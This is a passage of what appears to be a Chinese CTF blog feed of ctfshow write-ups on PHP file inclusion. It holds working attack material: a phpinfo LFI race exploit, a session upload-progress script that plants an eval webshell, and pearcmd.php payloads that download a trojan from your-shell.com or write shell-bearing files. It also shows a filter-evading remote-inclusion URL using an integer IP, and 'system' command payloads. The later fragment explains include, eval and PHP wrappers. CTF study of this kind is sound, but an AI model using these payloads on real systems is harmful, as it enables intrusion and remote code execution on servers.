class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class="line">padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">REQ1=<span class="string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s&quot;&quot;&quot;</span> %(<span class="built_in">len</span>(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line"><span class="comment">#modify this to suit the LFI script</span></span><br><span class="line">LFIREQ=<span class="string">&quot;&quot;&quot;GET /?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phpInfoLFI</span>(<span class="params">host, port, phpinforeq, offset, lfireq, tag</span>):</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s2.connect((host, port))</span><br><span class="line">s.send(phpinforeq)</span><br><span class="line">d = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(d) &lt; offset:</span><br><span class="line">d += s.recv(offset)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">s2.send(lfireq % (fn, host))</span><br><span class="line">d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">s.close()</span><br><span class="line">s2.close()</span><br><span class="line"><span class="keyword">if</span> d.find(tag) != -<span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span> fn</span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadWorker</span>(threading.Thread):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, e, l, m, *args</span>):</span><br><span class="line">threading.Thread.__init__(<span class="variable language_">self</span>)</span><br><span class="line"><span class="variable language_">self</span>.event = e</span><br><span class="line"><span class="variable language_">self</span>.lock = l</span><br><span class="line"><span class="variable language_">self</span>.maxattempts = m</span><br><span class="line"><span class="variable language_">self</span>.args = args</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">global</span> counter</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> <span class="variable language_">self</span>.event.is_set():</span><br><span class="line"><span class="keyword">with</span> <span class="variable language_">self</span>.lock:</span><br><span class="line"><span class="keyword">if</span> counter &gt;= <span class="variable language_">self</span>.maxattempts:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">counter+=<span class="number">1</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">x = phpInfoLFI(*<span class="variable language_">self</span>.args)</span><br><span class="line"><span class="keyword">if</span> <span class="variable language_">self</span>.event.is_set():</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> x:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nGot it! Shell created in /tmp/g&quot;</span></span><br><span class="line"><span class="variable language_">self</span>.event.<span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host,port))</span><br><span class="line">s.send(phpinforeq)</span><br><span class="line">d = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">i = s.recv(<span class="number">4096</span>)</span><br><span class="line">d+=i</span><br><span class="line"><span class="keyword">if</span> i == <span class="string">&quot;&quot;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment"># detect the final chunk</span></span><br><span class="line"><span class="keyword">if</span> i.endswith(<span class="string">&quot;0\r\n\r\n&quot;</span>):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s.close()</span><br><span class="line">i = d.find(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> i == -<span class="number">1</span>:</span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line"><span class="comment"># padded up a bit</span></span><br><span class="line"><span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">except</span> socket.error, e:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line">port=<span class="number">80</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> ValueError, e:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line">poolsz=<span class="number">10</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">poolsz = <span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> ValueError, e:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,</span><br><span class="line">reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">offset = getOffset(host, port, reqphp)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line">maxattempts = <span class="number">1000</span></span><br><span class="line">e = threading.Event()</span><br><span class="line">l = threading.Lock()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">sys.stdout.flush()</span><br><span class="line">tp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,poolsz):</span><br><span class="line">tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">t.start()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> e.is_set():</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">with</span> l:</span><br><span class="line">sys.stdout.write( <span class="string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">sys.stdout.flush()</span><br><span class="line"><span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span></span><br><span class="line"><span class="keyword">if</span> e.is_set():</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Woot! \m/&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nTelling threads to shutdown...&quot;</span></span><br><span class="line">e.<span class="built_in">set</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">t.join()</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="/img/baohan19.jpg" alt="输入图片说明"></p><blockquote><p>首先不用管这个脚本出现的错误，使用python27的powershell执行，首先输入1处的内容，再输入2处的内容，注意删除http:&#x2F;&#x2F;和8080之前的&#x2F;才可以执行，当出现Getting initial offset…的时候代表执行成功，接下来需要漫长的等待</p></blockquote><h4 id="3-php的session文件包含，upload-progress文件包含"><a href="#3-php的session文件包含，upload-progress文件包含" class="headerlink" title="3.php的session文件包含，upload_progress文件包含"></a>3.php的session文件包含，upload_progress文件包含</h4><p>强制文件上传时，通过上传一个固定的表单PHP_SESSION_UPLOAD_PROGRESS可以往服务器的session文件内写入我们的指定内容，然后在脚本运行过程中，包含，包含后可以执行里面的php代码</p><p>首先我们需要知道session文件包含的原理，当我们再cookie传入PHPSESSID&#x3D;???的时候，在临时文件中会生成一个sess_???的文件，我们通过上传到这个文件危险的php代码，在调用这个文件的时候，就执行了我们php恶意代码，从而拿到flag</p><p>下面是session文件包含的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session = requests.session()</span><br><span class="line">sess=<span class="string">&quot;ctfshow&quot;</span></span><br><span class="line">file_name=<span class="string">&quot;/var/www/html/1.php&quot;</span></span><br><span class="line">file_content=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://17bd4e8c-5837-44b7-b73c-ada8a17f9726.challenges.ctfer.com:8080/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">f&quot;&lt;?php echo &#x27;success!&#x27;; file_put_contents(&#x27;<span class="subst">&#123;file_name&#125;</span>&#x27;,&#x27;<span class="subst">&#123;file_content&#125;</span>&#x27;);?&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">file= &#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:sess</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url=url,data=data,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url=url+<span class="string">&quot;?file=../../../../../../tmp/sess_ctfshow&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;shell 地址为：&quot;</span>+url+<span class="string">&quot;/1.php&quot;</span>)</span><br><span class="line">exit()</span><br><span class="line">threads = [threading.Thread(target=write),threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><h4 id="ctfshow私教课web39-session文件包含"><a href="#ctfshow私教课web39-session文件包含" class="headerlink" title="ctfshow私教课web39(session文件包含)"></a>ctfshow私教课web39(session文件包含)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);         </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;file:///var/www/html/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>首先我们首先要传入cookie为PHPSESSID&#x3D;ctfshow,然后复制网址到脚本中，执行脚本，拿到网址，使用post传参1&#x3D;system(“tac &#x2F;*”);拿到flag</p></blockquote><p><img src="/img/baohan20.jpg" alt="输入图片说明"></p><blockquote><p><img src="/img/baohan21.jpg" alt="输入图片说明"></p></blockquote><blockquote><p><img src="/img/baohan22.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>我们就可以拿到flag了</p></blockquote><h4 id="4-pear文件包含"><a href="#4-pear文件包含" class="headerlink" title="4.pear文件包含"></a>4.pear文件包含</h4><p>条件1  有文件的包含点<br>条件2 开启了pear扩展<br>条件3 配置文件中register_argc_argv 设置为On，而默认为Off</p><p>满足上述三个条件才可以进行pear的rce</p><p>PEAR扩展<br>默认安装位置是 &#x2F;user&#x2F;local&#x2F;lib&#x2F;php&#x2F;</p><p>利用Pear扩展进行文件包含</p><h4 id="方法一-远程文件下载"><a href="#方法一-远程文件下载" class="headerlink" title="方法一  远程文件下载"></a>方法一  远程文件下载</h4><p>?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;ctfshow+install+-R+&#x2F;var&#x2F;www&#x2F;html&#x2F;+<a href="http://your-shell.com/1.php">http://your-shell.com/1.php</a></p><h4 id="ctfshow私教课web40-pear文件包含1-远程文件下载）"><a href="#ctfshow私教课web40-pear文件包含1-远程文件下载）" class="headerlink" title="ctfshow私教课web40(pear文件包含1.远程文件下载）"></a>ctfshow私教课web40(pear文件包含1.远程文件下载）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="comment">/*   # -*- coding: utf-8 -*-   # <span class="doctag">@Author</span>: h1xa   # <span class="doctag">@Date</span>: 2022-03-20 11:01:02   # <span class="doctag">@Last</span> Modified by: h1xa   # <span class="doctag">@Last</span> Modified time: 2022-03-20 22:18:10   # <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com   # <span class="doctag">@link</span>: https://ctfer.com      */</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];         </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log|filter/i&quot;</span>,<span class="variable">$file</span>))&#123;   <span class="keyword">include</span> <span class="variable">$file</span>;   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;   <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]))&#123;   <span class="title function_ invoke__">phpinfo</span>();   </span><br><span class="line">&#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/baohan23.jpg" alt="输入图片说明"></p><blockquote><p>远程下载木马到指定目录，<a href="http://your-shell/1.php%E7%9A%84%E6%BA%90%E7%A0%81%E5%86%85%E5%AE%B9%E4%B8%BA%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC">http://your-shell/1.php的源码内容为一句话木马</a><?php eval($_POST[1]);?>,ctfshow处的内容可以改为任意内容，然后访问第一个圈处的网址，使用POST传参，拿到我们的flag。1&#x3D;system(“tac &#x2F;*”);</p></blockquote><p><img src="/img/baohan24.jpg" alt="输入图片说明"></p><h4 id="方法二-生成配置文件，配置项传入我们恶意的php代码的形式"><a href="#方法二-生成配置文件，配置项传入我们恶意的php代码的形式" class="headerlink" title="方法二 生成配置文件，配置项传入我们恶意的php代码的形式"></a>方法二 生成配置文件，配置项传入我们恶意的php代码的形式</h4><p>配置型的形式   a&#x3D;b<br>username&#x3D;root<br>man_dir&#x3D;<?php eval($_POST[1]);?></p><p>文件名可以设置为ctfshow.php</p><blockquote><p>这个需要使用BP进行，不然会被编码就无法进行了<br>?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+-c+&#x2F;tmp&#x2F;ctf.php+-d+man_dir&#x3D;<?eval($_POST[1]);?>+-s+</p></blockquote><p>生成后，再使用火狐访问?file&#x3D;&#x2F;tmp&#x2F;ctf.php就可以执行我们的一句话木马了</p><h4 id="方法三-写配置文件方式"><a href="#方法三-写配置文件方式" class="headerlink" title="方法三 写配置文件方式"></a>方法三 写配置文件方式</h4><p>也是基于pearcmd.php的</p><p>?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;aaa+config-create+&#x2F;var&#x2F;www&#x2F;html&#x2F;<?=`$_POST[1]`;?>+3.php</p><blockquote><p>使用BP进行抓包发送，访问3.php,再反弹shell<img src="/img/baohan25.jpg" alt="输入图片说明"><img src="/img/baohan26.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>不能直接使用Hacber进行，不然会被编码，就无法执行了</p></blockquote><h4 id="5-远程文件包含"><a href="#5-远程文件包含" class="headerlink" title="5.远程文件包含"></a>5.远程文件包含</h4><p>?file&#x3D;<a href="http://43.154.234.66/1">http://731572802/1</a><br>通过域名转数字的形式，可以不用.来构造远程文件地址</p><p>那串数字是your-shell.com转ip后再由ip转整数后得到的，your-shell.com&#x2F;1页面内容是一句话木马<?php eval($_POST[1]);?><br>包含这个页面我们就相当于写入了一个一句话木马，我们通过这个木马就可以执行我们的系统命令了</p><h4 id="ctfshow私教课web41"><a href="#ctfshow私教课web41" class="headerlink" title="ctfshow私教课web41"></a>ctfshow私教课web41</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];      </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.|php|data/i&quot;</span>,<span class="variable">$file</span>))&#123;   <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);   </span><br><span class="line">&#125;      </span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/baohan27.jpg" alt="输入图片说明"></p><blockquote><p>远程文件包含拿到flag</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含知识+wp</title>
      <link href="/2025/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9F%A5%E8%AF%86+wp/"/>
      <url>/2025/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9F%A5%E8%AF%86+wp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ctfshow私教课第四节"><a href="#ctfshow私教课第四节" class="headerlink" title="ctfshow私教课第四节"></a>ctfshow私教课第四节</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含的本质</p><p>代码复用<br>并行开发<br>模块化<br>增加移植性</p><h4 id="include和eval的区别"><a href="#include和eval的区别" class="headerlink" title="include和eval的区别"></a>include和eval的区别</h4><p>include和eval一样，都不是函数，都是语言结构，无法通过配置文件禁用来禁用</p><p>include后面跟一个路径，表示要执行的php文件的路径，读取文件内容后，然后执行里面的php代码，像c语言中的函数。</p><p>eval后面跟php的代码，表示要执行的代码</p><h4 id="php的常见为文件包含语言结构"><a href="#php的常见为文件包含语言结构" class="headerlink" title="php的常见为文件包含语言结构"></a>php的常见为文件包含语言结构</h4><p>include 仅仅是包含这个文件，如果文件不存在，就继续执行后面的代码，无视这个include</p><p>require  必须存在这个文件，不然就无法正常执行后面的代码，就报错不执行了</p><p>include_once  包含一次，遇到错误继续执行</p><p>require_once 成功包含一次，遇到错误停止</p><h4 id="文件包含漏洞的含义"><a href="#文件包含漏洞的含义" class="headerlink" title="文件包含漏洞的含义"></a>文件包含漏洞的含义</h4><p>是指，通过文件包含时，包含的内容我们用户可控</p><h4 id="ctfhsow私教课web30"><a href="#ctfhsow私教课web30" class="headerlink" title="ctfhsow私教课web30"></a>ctfhsow私教课web30</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span class="line"><span class="comment">// flag in /var/www/secret   </span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];            </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>当路径中不含有php代码的时候，一律认为是文档，就会直接输出其中的内容</p></blockquote><p><img src="/img/baohan0.jpg" alt="输入图片说明"></p><blockquote><p>这里直接写路径，因为这个路径里的内容不含php代码，这里就直接输出了内容，我们就拿到了flag</p></blockquote><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="1-什么是协议"><a href="#1-什么是协议" class="headerlink" title="1.什么是协议"></a>1.什么是协议</h4><h5 id="网络层协议"><a href="#网络层协议" class="headerlink" title="网络层协议"></a>网络层协议</h5><p>IP协议<br>ICMP协议<br>ARP协议<br>IGMP协议</p><h5 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h5><p>http协议<br>https协议<br>ftp协议<br>ssh协议</p><h5 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h5><p>qq拉起协议   tencent :&#x2F;&#x2F;qq&#x2F;go123  交给专用的应用来处理，应用指本地程序</p><p>百度网盘拉起协议  下载 自动启动我们本地百度网盘的程序</p><h4 id="2-协议的格式"><a href="#2-协议的格式" class="headerlink" title="2.协议的格式"></a>2.协议的格式</h4><p>协议头：&#x2F;&#x2F;内容</p><h4 id="3-php中的协议"><a href="#3-php中的协议" class="headerlink" title="3.php中的协议"></a>3.php中的协议</h4><p>php支持的协议和封装协议</p><ul><li>file:&#x2F;&#x2F; — 访问本地文件系统     (常用)</li><li>http:&#x2F;&#x2F; — 访问 HTTP(s) 网址     (常用)</li><li>ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs(常用)</li><li>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）    (常用)</li><li>zlib:&#x2F;&#x2F; — 压缩流</li><li>data:&#x2F;&#x2F; — 数据（RFC 2397）    (常用)</li><li>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</li><li>phar:&#x2F;&#x2F; — PHP 归档     (常用)</li><li>ssh2:&#x2F;&#x2F; — Secure Shell 2</li><li>rar:&#x2F;&#x2F; — RAR</li><li>ogg:&#x2F;&#x2F; — 音频流</li><li>expect:&#x2F;&#x2F; — 处理交互式的流</li></ul><h4 id="4-file协议"><a href="#4-file协议" class="headerlink" title="4.file协议"></a>4.file协议</h4><p>不写协议名字，就默认是file协议，意味着file:&#x2F;&#x2F;可以省略</p><p>相对路径和绝对路径</p><p>flag,php index.php<br>&#x2F;var&#x2F;www&#x2F;html<br>执行 include”flag.php”    这是相对路径<br>相当于执行  include”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;  这是绝对路径</p><p>include”flag.php”;<br>include”..&#x2F;html&#x2F;flag.php”;<br>这里的..&#x2F;就是上一层目录<br>相当于include”&#x2F;var&#x2F;www&#x2F;html&#x2F;..&#x2F;html&#x2F;flag.php”<br>与直接写flag.php作用是相同的</p><h5 id="上层目录特性"><a href="#上层目录特性" class="headerlink" title="上层目录特性"></a>上层目录特性</h5><ol><li>每个目录都有上层目录</li><li>根目录的上层目录是根目录本身</li></ol><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;..&#x2F;..&#x2F;..&#x2F;  &#x3D;&gt;  根目录<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;  &#x3D;&gt; 根目录   上溯</p><h5 id="php目录整理特性"><a href="#php目录整理特性" class="headerlink" title="php目录整理特性"></a>php目录整理特性</h5><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;ctfshow&#x2F;..&#x2F;flag.php<br>传入的就是<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><h4 id="ctfshow私教课web31"><a href="#ctfshow私教课web31" class="headerlink" title="ctfshow私教课web31"></a>ctfshow私教课web31</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);      </span><br><span 